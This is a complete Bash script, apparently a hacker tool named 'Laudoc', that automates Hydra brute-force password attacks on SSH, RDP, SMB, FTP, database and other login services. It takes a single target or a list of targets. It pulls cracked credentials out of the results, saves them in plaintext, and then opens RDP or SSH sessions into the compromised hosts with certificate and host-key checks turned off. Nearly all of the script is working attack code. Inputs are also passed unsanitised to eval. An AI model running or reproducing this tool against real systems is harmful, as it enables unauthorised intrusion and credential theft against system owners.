#!/bin/bash
# TOOLNAME: Laudoc
# Author: Funbinet Ops
# Description: A Hydra-powered nonstop brute-force orchestrator that auto-manages targets, credentials, and session launches(rdp and ssh).


RED="\e[31m"; GREEN="\e[32m"; YELLOW="\e[33m"; CYAN="\e[36m"; BLUE="\e[34m"; RESET="\e[0m"

banner() {
    local NOW
    NOW=$(get_timestamp)
    printf "${RED}  ╔═════════════════════════╗${RESET}"
    printf "\n${RED}  ║${RESET}${GREEN}        L Λ U D O C        ${RESET}${RED}║${RESET}"
    printf "\n${RED}  ║ Hydra Terminal Automata ║${RESET}"
    printf "\n${RED}  ║     Author: ${RESET}${GREEN}Funbin💀${RESET}${RED}    ║${RESET}"
    printf "\n${RED}  ╚═════════════════════════╝${RESET}"
    printf "\n${RED}  [%s]:[EAT]${RESET}\n\n" "$NOW"
}


TOOLNAME="laudoc"
CURRENT_ATTACK_RESULTS_FILE=""
HYDRA_CMD="hydra"
CRED_STORE="docta_creds.txt"

TARGET=""
PROTOCOL=""
WORDLIST_FILE=""
USERNAME=""
USER_FILE=""
PORT=""
THREADS=""
LOGIN_PASS_FILE=""
TARGETS_FILE=""


get_timestamp() {
    echo -e "${YELLOW}$(date '+%Y-%m-%d_%H-%M-%S')${RESET}"
}

get_display_timestamp() {
    echo -e "${YELLOW}$(date '+%Y-%m-%d:%H:%M:%S:%Z')${RESET}"
}

check_dependencies() {
    echo -e ""
    echo -e "${CYAN}[?]::[Checking Dependencies]${RESET}"
    echo -e ""

    local DEPS=("hydra" "ssh")
    for dep in "${DEPS[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${RED}[✖]:: $dep not found. Attempting to install...${RESET}"
            if sudo apt-get update >/dev/null 2>&1 && sudo apt-get install -y "$dep" >/dev/null 2>&1; then
                echo -e "${GREEN}[✔]:: $dep installed.${RESET}"
            else
                echo -e "${RED}[✖]:: Could not install $dep automatically. Please install it manually.${RESET}"
            fi
        else
            echo -e "${GREEN}[✔]:: $dep found.${RESET}"
        fi
    done


    if ! command -v xfreerdp &>/dev/null; then
        echo -e "${RED}[✖]:: xfreerdp not found. RDP sessions will not work until you install 'freerdp2-x11'.${RESET}"
    else
        echo -e "${GREEN}[✔]:: xfreerdp found.${RESET}"
    fi

    if ! command -v xdg-open &>/dev/null && ! command -v nano &>/dev/null; then
        echo -e "${RED}[✖]:: Neither xdg-open nor nano found. Result file viewing might be limited.${RESET}"
    fi

    echo -e ""
}

reset_configuration() {
    TARGET=""
    PROTOCOL=""
    WORDLIST_FILE=""
    USERNAME=""
    USER_FILE=""
    PORT=""
    THREADS=""
    LOGIN_PASS_FILE=""
    TARGETS_FILE=""
    CURRENT_ATTACK_RESULTS_FILE=""
}


collect_target() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Set Target ]:${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Enter Target IP or Hostname (e.g., 192.168.1.1 or example.com):${RESET} ")" TARGET
    if [[ -z "$TARGET" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: Target cannot be empty.${RESET}"
        return 1
    fi
    echo -e ""
    echo -e "${GREEN}[✔]:: Target set to: ${TARGET}${RESET}"
    return 0
}

collect_protocol() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Set Protocol ]:${RESET}"
    echo -e ""
    echo -e "${YELLOW}  [ Available Protocols ]:${RESET}"
    echo -e ""
    echo -e "  [1]:: HTTP/HTTPS"
    echo -e "  [2]:: FTP"
    echo -e "  [3]:: SSH"
    echo -e "  [4]:: SMB"
    echo -e "  [5]:: POP3"
    echo -e "  [6]:: IMAP"
    echo -e "  [7]:: Telnet"
    echo -e "  [8]:: RDP"
    echo -e "  [9]:: VNC"
    echo -e "  [a]:: MySQL"
    echo -e "  [b]:: PostgreSQL"
    echo -e "  [c]:: Oracle"
    echo -e "  [d]:: Redis"
    echo -e "  [e]:: SIP"
    echo -e "  [f]:: SNMP"
    echo -e "  [g]:: Custom?"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Select Protocol (1-16) or enter custom:${RESET} ")" proto_choice

    case $proto_choice in
        1) PROTOCOL="http-get / http-post-form";;
        2) PROTOCOL="ftp";;
        3) PROTOCOL="ssh";;
        4) PROTOCOL="smb";;
        5) PROTOCOL="pop3";;
        6) PROTOCOL="imap";;
        7) PROTOCOL="telnet";;
        8) PROTOCOL="rdp";;
        9) PROTOCOL="vnc";;
        a) PROTOCOL="mysql";;
        b) PROTOCOL="postgres";;
        c) PROTOCOL="oracle";;
        d) PROTOCOL="redis";;
        e) PROTOCOL="sip";;
        f) PROTOCOL="snmp";;
        g)
            echo -e ""
            read -rp "$(printf "${BLUE}[?]: Enter custom protocol (e.g., http-proxy):${RESET} ")" custom_proto
            if [[ -z "$custom_proto" ]]; then
                echo -e ""
                echo -e "${RED}[✖]:: Custom protocol cannot be empty.${RESET}"
                return 1
            fi
            PROTOCOL="$custom_proto"
            ;;
        *)
            echo -e ""
            echo -e "${RED}[✖]:: Invalid choice.${RESET}"
            return 1
            ;;
    esac

    echo -e ""
    echo -e "${GREEN}[✔]:: Protocol set to: ${PROTOCOL}${RESET}"
    return 0
}

collect_credential_file() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Set Combined login:pass File (-C) ]:${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Enter path to combined login:pass file (user:pass each line). Leave empty to cancel:${RESET} ")" lf
    if [[ -z "$lf" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: Combined file not set.${RESET}"
        return 1
    elif [[ ! -f "$lf" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: File not found: ${lf}.${RESET}"
        return 1
    fi
    LOGIN_PASS_FILE="-C \"$lf\""
    echo -e ""
    echo -e "${GREEN}[✔]:: Combined login:pass file set: ${lf}${RESET}"
    return 0
}

collect_credential_source() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Choose Credential Source ]:${RESET}"
    echo -e ""
    echo -e "${YELLOW}  [1]:: Path to usernames.txt/passwords.txt ${RESET}"
    echo -e "${YELLOW}  [2]:: Use a combined login:pass file (-C)${RESET}"
    echo -e "${YELLOW}  [3]:: Clear current credentials and Start${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Select option (1-3):${RESET} ")" cred_source_choice

    USERNAME=""; USER_FILE=""; WORDLIST_FILE=""; LOGIN_PASS_FILE=""

    case $cred_source_choice in
        1)
            echo -e ""
            echo -e "${GREEN}[✔]:: Selected separate wordlists.${RESET}"
            return 0
            ;;
        2)
            collect_credential_file && return 0
            echo -e ""
            echo -e "${RED}[✖]:: Combined login:pass file not set.${RESET}"
            return 1
            ;;
        3)
            echo -e ""
            echo -e "${GREEN}[✔]:: Credentials cleared.${RESET}"
            return 1
            ;;
        *)
            echo -e ""
            echo -e "${RED}[✖]:: Invalid choice.${RESET}"
            return 1
            ;;
    esac
}

collect_usernames() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Specify Usernames ]:${RESET}"
    echo -e ""
    echo -e "${YELLOW}  [1]:: Specify a single username${RESET}"
    echo -e "${YELLOW}  [2]:: Specify path to usernames.txt${RESET}"
    echo -e "${YELLOW}  [3]:: Clear current username setting${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Select option (1-3):${RESET} ")" user_choice

    USERNAME=""; USER_FILE=""

    case $user_choice in
        1)
            echo -e ""
            read -rp "$(printf "${BLUE}[?]: Enter single username:${RESET} ")" USERNAME_INPUT
            if [[ -z "$USERNAME_INPUT" ]]; then
                echo -e ""
                echo -e "${RED}[✖]:: Username cannot be empty.${RESET}"
                return 1
            fi
            USERNAME="$USERNAME_INPUT"
            echo -e ""
            echo -e "${GREEN}[✔]:: Username set to: ${USERNAME}${RESET}"
            return 0
            ;;
        2)
            echo -e ""
            read -rp "$(printf "${BLUE}[?]: Enter path to username list file (e.g., /path/to/users.txt):${RESET} ")" USER_FILE_INPUT
            if [[ ! -f "$USER_FILE_INPUT" ]]; then
                echo -e ""
                echo -e "${RED}[✖]:: Username file not found: ${USER_FILE_INPUT}.${RESET}"
                return 1
            fi
            USER_FILE="$USER_FILE_INPUT"
            echo -e ""
            echo -e "${GREEN}[✔]:: Username file set to: ${USER_FILE}${RESET}"
            return 0
            ;;
        3)
            echo -e ""
            echo -e "${GREEN}[✔]:: Username setting cleared.${RESET}"
            return 1
            ;;
        *)
            echo -e ""
            echo -e "${RED}[✖]:: Invalid choice.${RESET}"
            return 1
            ;;
    esac
}

collect_wordlist() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Set Password Wordlist ]:${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Enter path to password wordlist. Leave empty to clear:${RESET} ")" WORDLIST_FILE_INPUT
    if [[ -z "$WORDLIST_FILE_INPUT" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: Password wordlist cannot be empty.${RESET}"
        return 1
    elif [[ ! -f "$WORDLIST_FILE_INPUT" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: Wordlist file not found: ${WORDLIST_FILE_INPUT}.${RESET}"
        return 1
    fi
    WORDLIST_FILE="$WORDLIST_FILE_INPUT"
    echo -e ""
    echo -e "${GREEN}[✔]:: Password wordlist set to: ${WORDLIST_FILE}${RESET}"
    return 0
}

collect_targets_file() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Use Target List File (-M) ]:${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Enter path to file with target servers (one per line). Leave empty to disable:${RESET} ")" target_list_file_input
    if [[ -z "$target_list_file_input" ]]; then
        TARGETS_FILE=""
        echo -e ""
        echo -e "${GREEN}[✔]:: Target list file disabled.${RESET}"
        return 0
    elif [[ ! -f "$target_list_file_input" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: Target list file not found: ${target_list_file_input}.${RESET}"
        TARGETS_FILE=""
        return 1
    fi
    TARGETS_FILE="-M \"$target_list_file_input\""
    echo -e ""
    echo -e "${GREEN}[✔]:: Target list file set to: ${target_list_file_input}${RESET}"
    return 0
}

collect_port() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Set Port ]:${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Enter target port number. Press Enter for default:${RESET} ")" custom_port
    if [[ -z "$custom_port" ]]; then
        PORT=""
        echo -e ""
        echo -e "${GREEN}[✔]:: Using default port for selected protocol.${RESET}"
        return 0
    elif [[ "$custom_port" =~ ^[0-9]+$ && "$custom_port" -ge 1 && "$custom_port" -le 65535 ]]; then
        PORT="-s $custom_port"
        echo -e ""
        echo -e "${GREEN}[✔]:: Port set to: $custom_port${RESET}"
        return 0
    else
        echo -e ""
        echo -e "${RED}[✖]:: Invalid port number.${RESET}"
        PORT=""
        return 1
    fi
}

collect_threads() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Set Threads ]:${RESET}"
    echo -e ""
    echo -e "${YELLOW}  [1]:: 1-8 threads${RESET}"
    echo -e "${YELLOW}  [2]:: 9-32 threads${RESET}"
    echo -e "${YELLOW}  [3]:: 33-64 threads${RESET}"
    echo -e "${YELLOW}  [4]:: Specify number${RESET}"
    echo -e "${YELLOW}  [5]:: Use Hydra default${RESET}"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]: Select Option and Auto Execute Hydra:${RESET} ")" thread_choice

    case $thread_choice in
        1) THREADS="-t 8";;
        2) THREADS="-t 32";;
        3) THREADS="-t 64";;
        4)
            echo -e ""
            read -rp "$(printf "${BLUE}[?]: Enter custom number of threads (1-256):${RESET} ")" custom_threads
            if [[ "$custom_threads" =~ ^[0-9]+$ && "$custom_threads" -ge 1 && "$custom_threads" -le 256 ]]; then
                THREADS="-t $custom_threads"
                echo -e ""
                echo -e "${GREEN}[✔]:: Threads set to: $custom_threads${RESET}"
            else
                echo -e ""
                echo -e "${RED}[✖]:: Invalid number of threads.${RESET}"
                THREADS=""
            fi
            ;;
        5)
            THREADS=""
            echo -e ""
            echo -e "${GREEN}[✔]:: Thread setting cleared.${RESET}"
            ;;
        *)
            echo -e ""
            echo -e "${RED}[✖]:: Invalid choice.${RESET}"
            THREADS=""
            ;;
    esac
    return 0
}


show_current_configuration() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Current Configuration ]:${RESET}"
    echo -e ""
    echo -e "  ${YELLOW}Target: ${RESET} ${TARGET:-"Not set"}"
    echo -e "  ${YELLOW}Target List File (-M): ${RESET} ${TARGETS_FILE:-"Not set"}"
    echo -e "  ${YELLOW}Protocol: ${RESET} ${PROTOCOL:-"Not set"}"
    if [[ -n "$LOGIN_PASS_FILE" ]]; then
        local cleanC
        cleanC=$(echo "$LOGIN_PASS_FILE" | sed 's/-C //;s/"//g')
        echo -e "  ${YELLOW}Pass File (-C): ${RESET} ${cleanC}"
    else
        echo -e "  ${YELLOW}Single Username (-l): ${RESET} ${USERNAME:-"Not set"}"
        echo -e "  ${YELLOW}Username File (-L): ${RESET} ${USER_FILE:-"Not set"}"
        echo -e "  ${YELLOW}Password Wordlist (-P): ${RESET} ${WORDLIST_FILE:-"Not set"}"
    fi
    echo -e "  ${YELLOW}Port Number(-s):${RESET} ${PORT:-"Default"}"
    echo -e "  ${YELLOW}Number of Threads (-t):${RESET} ${THREADS:-"Hydra default (16)"}"
    echo -e "  ${YELLOW}Last Attack Results Path: ${RESET} ${CYAN}${CURRENT_ATTACK_RESULTS_FILE:-"None generated yet"}${RESET}"
    echo -e ""
}


build_hydra_command() {
    local cmd_options=""

    if [[ -n "$LOGIN_PASS_FILE" ]]; then
        cmd_options+=" $LOGIN_PASS_FILE"
    else
        if [[ -n "$USERNAME" ]]; then
            cmd_options+=" -l \"$USERNAME\""
        elif [[ -n "$USER_FILE" ]]; then
            cmd_options+=" -L \"$USER_FILE\""
        fi

        if [[ -n "$WORDLIST_FILE" ]]; then
            cmd_options+=" -P \"$WORDLIST_FILE\""
        fi
    fi

    if [[ -n "$PORT" ]]; then
        cmd_options+=" $PORT"
    fi
    if [[ -n "$THREADS" ]]; then
        cmd_options+=" $THREADS"
    fi

    cmd_options+=" -V"
    local target_spec=""
    if [[ -n "$TARGETS_FILE" ]]; then
        target_spec+=" $TARGETS_FILE"
    elif [[ -n "$TARGET" ]]; then
        target_spec+=" \"$TARGET\""
    fi

    echo "$HYDRA_CMD $cmd_options $target_spec $PROTOCOL"
}

validate_attack_parameters() {
    if [[ -z "$TARGET" && -z "$TARGETS_FILE" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: Error: No target or target list file specified.${RESET}"
        return 1
    fi
    if [[ -z "$PROTOCOL" ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: Error: No protocol specified.${RESET}"
        return 1
    fi
    if [[ -z "$LOGIN_PASS_FILE" ]]; then
        if [[ -z "$USERNAME" && -z "$USER_FILE" ]]; then
            echo -e ""
            echo -e "${RED}[✖]:: Error: No username (single or file) specified.${RESET}"
            return 1
        fi
        if [[ -z "$WORDLIST_FILE" ]]; then
            echo -e ""
            echo -e "${RED}[✖]:: Error: No password wordlist specified.${RESET}"
            return 1
        fi
    fi
    return 0
}

run_attack_confirmation() {
    echo -e ""
    echo -e "${CYAN}[=]::[${TOOLNAME}]::[ Attack Config Summary ]${RESET}"
    echo -e ""
    NOW=$(get_display_timestamp)
    echo -e "${YELLOW}[${TOOLNAME}]::[${NOW}]:[EAT]${RESET}"
    echo -e ""
    show_current_configuration

    if ! validate_attack_parameters; then
        echo -e ""
        echo -e "${RED}[✖]:: Missing critical parameters. Please correct the configuration.${RESET}"
        return 1
    fi

    local generated_command
    generated_command=$(build_hydra_command)
    echo -e "${GREEN}[✔]:: Proposed Hydra Command:${RESET}"
    echo -e ""
    echo -e "${CYAN}    $generated_command -o \"\$RESULT_FILE\"${RESET}"
    echo -e ""
    echo -e "${BLUE}     [ ATTACK CONFIRMATION (auto-exec) ]${RESET}"
    echo -e ""
    echo -e "${GREEN}[✔]::[Executing Hydra]: Success !${RESET}"
    execute_brute_force_attack "$generated_command"
    return 0
}

execute_brute_force_attack() {
    local cmd_to_execute="$1"

    local timestamp
    timestamp=$(date '+%Y-%m-%d_%H-%M-%S')
    CURRENT_ATTACK_RESULTS_FILE="$PWD/Docta_results_${timestamp}.txt"
    mkdir -p "$(dirname "$CURRENT_ATTACK_RESULTS_FILE")"

    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[Attack Running]: Buckle up noob..${RESET}"
    echo -e ""
    echo -e "${YELLOW}[${TOOLNAME}]::[Results Saved]: ${CURRENT_ATTACK_RESULTS_FILE}${RESET}"
    echo -e ""
    echo -e "${YELLOW}[${TOOLNAME}]::[ Start Time ]: $(get_display_timestamp)${RESET}"
    echo -e ""
    echo -e "[=]::[Docta Attack Start] -[ $(date '+%Y-%m-%d %H:%M:%S') ]" >> "$CURRENT_ATTACK_RESULTS_FILE"
    echo "Hydra Command: $cmd_to_execute -o \"$CURRENT_ATTACK_RESULTS_FILE\"" >> "$CURRENT_ATTACK_RESULTS_FILE"
    echo "Configuration Summary:" >> "$CURRENT_ATTACK_RESULTS_FILE"
    show_current_configuration | sed 's/\x1b\[[0-9;]*m//g' >> "$CURRENT_ATTACK_RESULTS_FILE"

    eval "$cmd_to_execute -o \"$CURRENT_ATTACK_RESULTS_FILE\"" >"$CURRENT_ATTACK_RESULTS_FILE" 2>&1
    local hydra_exit=$?

    if [[ $hydra_exit -eq 0 ]]; then
        local found_creds
        found_creds=$(grep -E -i 'login: .* password|host: .*   login: .*   password:|host: .* login: .* password:|host: .* login: .*' "$CURRENT_ATTACK_RESULTS_FILE" | head -n 5)

        if [[ -n "$found_creds" ]]; then
            echo -e ""
            echo -e "${GREEN}[✔]::[Attack Result]::[Credentials found]: ${CURRENT_ATTACK_RESULTS_FILE}${RESET}"
            echo -e ""
            echo -e "${CYAN}${found_creds}${RESET}"
        else
            echo -e ""
            echo -e "${RED}[✖]::[Attack Finished]: No credentials found.${RESET}"
        fi
    else
        echo -e "${RED}[✖]::[Attack Failed]: Hydra exited with code ${hydra_exit}. Check:${CURRENT_ATTACK_RESULTS_FILE}${RESET}"
    fi

    echo -e "[=]::[Docta Attack End] - [ $(date '+%Y-%m-%d %H:%M:%S') ]" >> "$CURRENT_ATTACK_RESULTS_FILE"
    echo -e ""
    echo -e "${YELLOW}[${TOOLNAME}]::[End Time]: $(get_display_timestamp)${RESET}"
}


extract_creds_from_file() {
    local file="$1"
    grep -E -i 'login: .*password:|host: .*login: .*password:|login: .*   password:' "$file" 2>/dev/null \
        | sed -E 's/\x1b\[[0-9;]*[a-zA-Z]//g' \
        | awk '!seen[$0]++{print $0}'
}

parse_cred_line() {
    local line="$1"
    local host="" login="" pass="" proto=""

    if [[ "$line" =~ host:[[:space:]]*([0-9a-zA-Z\.\-_:]+) ]]; then
        host="${BASH_REMATCH[1]}"
    fi
    if [[ "$line" =~ login:[[:space:]]*([^[:space:]]+) ]]; then
        login="${BASH_REMATCH[1]}"
    fi
    if [[ "$line" =~ password:[[:space:]]*([^[:space:]]+) ]]; then
        pass="${BASH_REMATCH[1]}"
    fi

    if echo "$line" | grep -qiE '\[.*rdp.*\]| rdp|3389'; then
        proto="rdp"
    elif echo "$line" | grep -qiE 'ssh|22/ssh|ssh:'; then
        proto="ssh"
    fi
    
    printf "%s|%s|%s|%s" "${host}" "${login}" "${pass}" "${proto}"
}

store_cred() {
    local host="$1"
    local proto="$2"
    local user="$3"
    local pass="$4"
    local ts
    ts=$(date '+%Y-%m-%d_%H:%M:%S')
    if [[ -z "$host" ]]; then host="<unknown>"; fi
    echo "${host}|${proto}|${user}|${pass}|${ts}" >> "${CRED_STORE}"
    echo -e ""
    echo -e "${GREEN}[✔]::[Saved At]: ${CRED_STORE}: ${host}|${proto}|${user}|[REDACTED]${RESET}"
}

start_session_from_results() {
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]::[ Result Files Management ]${RESET}"
    shopt -s nullglob
    local files=(Docta_results_*.txt)
    shopt -u nullglob

    if [[ ${#files[@]} -eq 0 ]]; then
    echo -e ""
        echo -e "${RED}[✖]:: No Docta result files found.${RESET}"
        return 0
    fi

    echo -e ""
    echo -e "${YELLOW}[ Available result files ]:${RESET}"
    echo -e ""
    local i=1
    for f in "${files[@]}"; do
        echo -e "  [${YELLOW}$i${RESET}]:: $(basename "$f")"
        ((i++))
    done
    echo -e "  [${YELLOW}$i${RESET}]:: Cancel"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]::[Choose file (number)]:: ${RESET}")" file_choice
    if ! [[ "$file_choice" =~ ^[0-9]+$ ]] || ((file_choice < 1 || file_choice > ${#files[@]})); then
        echo -e ""
        echo -e "${RED}[✖]:: Cancelled or invalid selection.${RESET}"
        return 0
    fi

    local sel_file="${files[$((file_choice-1))]}"
    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]:: Scanning ${sel_file} Credentials..${RESET}"
    local lines
    IFS=$'\n' read -r -d '' -a lines < <(extract_creds_from_file "$sel_file" && printf '\0') || true

    if [[ ${#lines[@]} -eq 0 ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: No credential lines detected in file.${RESET}"
        return 0
    fi

    echo -e ""
    echo -e "${GREEN}[✔]::[Found Credentials]:${RESET}"
    echo -e ""
    for idx in "${!lines[@]}"; do
        echo -e "  [${YELLOW}$((idx+1))${RESET}]:: ${lines[$idx]}"
    done
    echo -e "  [${YELLOW}$(( ${#lines[@]} + 1 ))${RESET}]:: Cancel"
    echo -e ""
    read -rp "$(printf "${BLUE}[?]::[Choose credential (number)]: ${RESET}")" cred_choice
    if ! [[ "$cred_choice" =~ ^[0-9]+$ ]] || ((cred_choice < 1 || cred_choice > ${#lines[@]})); then
        echo -e ""
        echo -e "${RED}[✖]:: Cancelled or invalid selection.${RESET}"
        return 0
    fi

    local selected_line="${lines[$((cred_choice-1))]}"
    printf -v parsed "%s" "$(parse_cred_line "$selected_line")"
    IFS='|' read -r HOST LOGIN PASS PROTO_HINT <<< "$parsed"

    if [[ -z "$HOST" ]]; then
        HOST=$(grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' "$sel_file" | head -n1 || true)
    fi
 
    echo -e ""
    store_cred "${HOST}" "${PROTO_HINT:-unknown}" "${LOGIN}" "${PASS}"

    echo -e ""
    echo -e "${CYAN}[${TOOLNAME}]:: Launching session for host:${HOST} username:${LOGIN} protocol:${PROTO_HINT:-<unknown>} ${RESET}"
    
    if [[ "$PROTO_HINT" == "rdp" || "$selected_line" =~ 3389 || "$sel_file" =~ 3389 ]]; then
        if ! command -v xfreerdp &>/dev/null; then
            echo -e ""
            echo -e "${RED}[✖]:: xfreerdp not installed. Install 'sudo apt install freerdp2-x11'.${RESET}"
            return 0
        fi
        local cmd="xfreerdp /u:${LOGIN} /p:${PASS} /v:${HOST} /cert-ignore"
        echo -e ""
        echo -e "${GREEN}[✔]:: Executing: ${cmd}${RESET}"
        eval "${cmd}"
        echo -e ""
        echo -e "${RED}[✖]:: RDP session ended.${RESET}"
        return 0
    fi

    if [[ "$PROTO_HINT" == "ssh" || "$selected_line" =~ :22 || "$selected_line" =~ ssh ]]; then
        if ! command -v ssh &>/dev/null; then
            echo -e ""
            echo -e "${RED}[✖]:: ssh client not available.${RESET}"
            return 0
        fi
        
        if command -v sshpass &>/dev/null; then
            echo -e ""
            echo -e "${GREEN}[✔]:: Using sshpass to spawn ssh session.${RESET}"
            eval "sshpass -p '${PASS}' ssh -o StrictHostKeyChecking=no ${LOGIN}@${HOST}"
        else
            echo -e ""
            echo -e "${RED}[✖]:: sshpass not installed; launching interactive ssh (you will be prompted).${RESET}"
            eval "ssh -o StrictHostKeyChecking=no ${LOGIN}@${HOST}"
        fi
        echo -e ""
        echo -e "${RED}[✖]:: SSH session ended.${RESET}"
        return 0
    fi

    echo -e ""
    echo -e "${RED}[✖]:: Unknown protocol. Suggested commands:${RESET}"
    echo -e ""
    echo -e "  RDP: xfreerdp /u:${LOGIN} /p:${PASS} /v:${HOST} /cert-ignore"
    echo -e ""
    echo -e "  SSH: ssh ${LOGIN}@${HOST}  (use sshpass -p '${PASS}' to auto supply password)"
    return 0
}


start_brute_force_attack_flow() {
    reset_configuration
    echo -e ""
    echo -e "${CYAN}[=]::[${TOOLNAME}]: Configure New Attack${RESET}"
    echo -e ""
    NOW=$(get_display_timestamp)
    echo -e "${YELLOW}[${TOOLNAME}]::[${NOW}]:[EAT]${RESET}"
    echo -e ""
    echo -e "${YELLOW}[✔]:: Starting new attack config sequence...${RESET}"
    echo -e ""

    if ! collect_target; then return; fi
    echo -e ""
    if ! collect_protocol; then return; fi
    echo -e ""
    local cred_source_set="no"
    while [[ "$cred_source_set" == "no" ]]; do
        if collect_credential_source; then
            if [[ -n "$LOGIN_PASS_FILE" ]]; then
                cred_source_set="yes"
            else
                local username_set="no"
                while [[ "$username_set" == "no" ]]; do
                    if collect_usernames; then username_set="yes"; fi
                done

                local password_set="no"
                while [[ "$password_set" == "no" ]]; do
                    if collect_wordlist; then password_set="yes"; fi
                done

                if [[ "$username_set" == "yes" && "$password_set" == "yes" ]]; then
                    cred_source_set="yes"
                fi
            fi
        else
            echo -e ""
            echo -e "${RED}[✖]:: Credential source not fully configured. Please try again.${RESET}"
        fi
    done

    collect_targets_file || true
    echo -e ""
    collect_port || true
    echo -e ""
    collect_threads || true
    echo -e ""
    run_attack_confirmation
}

manage_result_files() {
    echo -e ""
    echo -e "${CYAN}[=]::[${TOOLNAME}]::[ Result Files Management ]${RESET}"
    echo -e ""
    NOW=$(get_display_timestamp)
    echo -e "${YELLOW}[${TOOLNAME}]::[${NOW}]:[EAT]${RESET}"
    echo -e ""

    shopt -s nullglob
    local result_files=(Docta_results_*.txt)
    shopt -u nullglob

    if [[ ${#result_files[@]} -eq 0 ]]; then
        echo -e ""
        echo -e "${RED}[✖]:: No Docta result files found.${RESET}"
        return
    fi

    echo -e "$BLUE   [ RESULT FILES ]$RESET"
    echo -e ""
    echo -e "${YELLOW}[$TOOLNAME]::[Select a file to View]:${RESET}"
    local i=1
    for file in "${result_files[@]}"; do
        echo -e "  [${YELLOW}$i${RESET}]:: $(basename "$file")"
        ((i++))
    done
    echo -e "  [${YELLOW}$i${RESET}]:: Return to Main Menu"
    echo -e ""
    read -rp "$(echo -e ${BLUE}[${TOOLNAME}]::[SELECT FILE]:${RESET} )" file_choice

    if [[ "$file_choice" =~ ^[0-9]+$ ]] && [[ "$file_choice" -ge 1 ]] && [[ "$file_choice" -le ${#result_files[@]} ]]; then
        local selected_file="${result_files[$((file_choice-1))]}"
        echo -e ""
        echo -e "${CYAN}[${TOOLNAME}]::[Opening]: ${selected_file}${RESET}"
        echo -e ""
        if command -v xdg-open &>/dev/null; then
            xdg-open "$selected_file" & disown
        elif command -v nano &>/dev/null; then
            nano "$selected_file"
        else
            echo -e ""
            echo -e "${RED}[✖]:: No suitable viewer found (xdg-open or nano). Please install.${RESET}"
        fi
    elif [[ "$file_choice" =~ ^[0-9]+$ ]] && [[ "$file_choice" -eq $i ]]; then
        return
    else
        echo -e ""
        echo -e "${RED}[✖]::[Invalid Option]${RESET}"
    fi
}

main_menu() {
    banner
    check_dependencies
    echo -e ""
    echo -e "${CYAN}[=]::[${TOOLNAME}]: Starting >.<${RESET}"
    echo -e ""
    NOW=$(get_display_timestamp)
    echo -e "${YELLOW}[${TOOLNAME}]::[${NOW}]:[EAT]${RESET}"
    echo -e ""

    while true; do
        echo -e "${BLUE}     [ MAIN MENU ]${RESET}"
        echo -e ""
        echo -e "${YELLOW}     [1]:: Start Brute-Force Attack${RESET}"
        echo -e "${YELLOW}     [2]:: See Current Configuration${RESET}"
        echo -e "${YELLOW}     [3]:: View Current Result Files${RESET}"
        echo -e "${YELLOW}     [4]:: Start Session From Results${RESET}"
        echo -e "${YELLOW}     [5]:: Exit${RESET}"
        echo -e ""
        read -rp "$(echo -e ${BLUE}[${TOOLNAME}]::[SELECT OPTION]:${RESET} )" main_choice
        echo -e ""

        case $main_choice in
            1) start_brute_force_attack_flow ;;
            2) show_current_configuration ;;
            3) manage_result_files ;;
            4) start_session_from_results ;;
            5)
                echo -e ""
                echo -e "${RED}[✖]::[${TOOLNAME}]:: Exiting >${RESET}"
                NOW=$(get_display_timestamp)
                echo -e "${YELLOW}[${TOOLNAME}]::[${NOW}]:[EAT]${RESET}"
                echo -e ""
                echo -e "${BLUE}[FUNBINET]:[✔]: Automation is not Luxury > it's Survival.${RESET}"
                echo -e "${RED}[FUNBINET]:: Bye >x<${RESET}"
                exit 0
                ;;
            *) 
            echo -e ""
            echo -e "${RED}[✖]::[Invalid Option]${RESET}" ;;
        esac
        echo -e ""
    done
}

main_menu

